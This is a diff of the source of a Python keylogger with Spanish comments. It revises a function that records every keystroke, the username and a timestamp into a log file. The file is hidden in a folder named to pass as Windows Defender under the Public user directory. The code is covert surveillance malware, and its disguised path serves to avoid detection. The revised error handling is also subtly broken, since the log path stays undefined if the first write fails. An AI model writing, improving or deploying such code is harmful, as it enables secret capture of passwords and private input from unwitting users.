@@ -192,16 +192,19 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
 
 # Obtiene registro de teclas y guarda en un archivo log.txt
 def Klogger():
-    CreateDir()  # Function: Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-    log = os.environ.get(
+    try:        # Intenta crear el archivo
+        log = os.environ.get(
         'pylogger_file',
         os.path.expanduser('C:\\Users\\Public\\Security\\Windows Defender\\log.txt')
-    )
-    T = datetime.datetime.now()
-    getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"
+        )
+    
+        T = datetime.datetime.now()
+        getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"
 
-    with open (log, "a") as f:
-        f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
+        with open (log, "a") as f:
+            f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
+    except: # Si no puede crear el archivo, crea el directorio faltante
+        CreateDir()  # Function: Crea el directorio ==> C:\Users\Public\Security\Windows Defender
     
     def on_press(key):
         with open(log, "a") as f:
@@ -213,7 +216,6 @@ def Klogger():
                 #print("[KeyConMax]")
                 print(KeyConMax(str(key)))
                 f.write(KeyConMax(str(key)))
-                
     with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
         listener.join() 
 
